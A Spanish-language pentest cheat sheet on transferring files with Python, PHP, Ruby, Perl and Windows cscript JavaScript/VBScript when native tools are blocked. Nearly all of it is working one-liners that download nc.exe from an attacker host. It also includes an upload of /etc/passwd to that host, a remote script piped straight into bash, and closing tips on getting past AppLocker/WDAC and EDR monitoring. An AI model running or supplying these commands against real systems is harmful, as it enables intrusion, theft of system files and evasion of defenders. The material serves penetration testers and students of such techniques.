# Transferencia de Archivos con Código

Cuando las herramientas nativas están bloqueadas, los intérpretes de lenguajes de programación (Python, PHP, Ruby, Perl...) suelen estar disponibles y pueden usarse para descargar o servir archivos con una sola línea de código.

### Python

#### Descarga

```python
# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.1.100/nc.exe', 'nc.exe')"

# Python 2
python2 -c "import urllib; urllib.urlretrieve('http://192.168.1.100/nc.exe', 'nc.exe')"

# Con requests (si está disponible)
python3 -c "import requests; open('nc.exe','wb').write(requests.get('http://192.168.1.100/nc.exe').content)"
```

#### Servidor web rápido

```bash
python3 -m http.server 8080
python2.7 -m SimpleHTTPServer 8080
```

#### Upload

```python
# Servidor con soporte de upload
pip3 install uploadserver
python3 -m uploadserver 8080

# Subir desde cliente
python3 -c "
import requests
files = {'files': open('/etc/passwd','rb')}
requests.post('http://192.168.1.100:8080/upload', files=files)
"
```

### PHP

#### Descarga

```bash
# file_get_contents + file_put_contents
php -r '$file = file_get_contents("http://192.168.1.100/nc.exe"); file_put_contents("nc.exe", $file);'

# Con fopen
php -r 'const BUFFER = 1024; $fremote = fopen("http://192.168.1.100/nc.exe", "rb"); $flocal = fopen("nc.exe", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless — ejecutar directamente
php -r '$lines = @file("http://192.168.1.100/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Servidor web

```bash
php -S 0.0.0.0:8080
```

### Ruby

#### Descarga

```bash
ruby -e 'require "net/http"; File.write("nc.exe", Net::HTTP.get(URI.parse("http://192.168.1.100/nc.exe")))'
```

#### Servidor web

```bash
ruby -run -ehttpd . -p 8080
```

### Perl

#### Descarga

```bash
# Con LWP::Simple
perl -e 'use LWP::Simple; getstore("http://192.168.1.100/nc.exe", "nc.exe");'

# Con LWP::UserAgent (más control)
perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new; my $r = $ua->get("http://192.168.1.100/nc.exe"); open(F,">nc.exe"); print F $r->content; close F;'
```

### JavaScript (cscript — Windows)

En sistemas Windows con acceso a `cscript.exe`:

```javascript
// Guardar como wget.js y ejecutar con: cscript wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript /nologo wget.js http://192.168.1.100/nc.exe nc.exe
```

### VBScript (Windows)

```vbscript
' Guardar como wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript /nologo wget.vbs http://192.168.1.100/nc.exe nc.exe
```

### Referencia rápida

| Lenguaje      | Descarga                          | Servidor                      |
| ------------- | --------------------------------- | ----------------------------- |
| Python 3      | `urllib.request.urlretrieve(...)` | `python3 -m http.server`      |
| Python 2      | `urllib.urlretrieve(...)`         | `python2 -m SimpleHTTPServer` |
| PHP           | `file_get_contents(...)`          | `php -S 0.0.0.0:8080`         |
| Ruby          | `Net::HTTP.get(...)`              | `ruby -run -ehttpd . -p 8080` |
| Perl          | `LWP::Simple::getstore(...)`      | —                             |
| JS (Windows)  | `WinHttp.WinHttpRequest`          | —                             |
| VBS (Windows) | `Microsoft.XMLHTTP`               | —                             |

> En sistemas Windows, `cscript` con un script `.js` o `.vbs` es útil cuando PowerShell está completamente bloqueado por AppLocker o WDAC, ya que estos intérpretes forman parte del sistema operativo base.

> Los one-liners de Python y PHP son detectados con relativa facilidad por EDRs modernos cuando hacen conexiones HTTP salientes desde procesos de intérprete. Combinar con otras técnicas de evasión si el entorno tiene monitorización activa.
